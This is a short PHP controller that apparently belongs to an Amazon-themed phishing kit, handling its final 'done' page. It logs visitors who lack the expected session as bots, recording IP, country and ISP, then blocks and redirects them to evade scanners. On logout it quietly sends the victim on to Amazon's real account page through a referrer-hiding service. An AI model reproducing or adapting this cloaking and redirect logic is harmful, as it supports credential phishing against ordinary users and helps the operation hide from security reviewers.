<?php 
defined("ACCESS") or die('Konz');

class Done 
{
	public function __construct()
	{
		$this->pc = new Pc();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 8)){
			
			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Access Page Without Session|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		} 
	}
	
	public function index()
	{
		echo view('done/index');
	}

	public function logout()
	{
		session_destroy();
		_blocks();
		redirect('https://href.li/?https://www.amazon.com/gp/css/homepage.html?ref_=nav_AccountFlyout_ya');
	}
}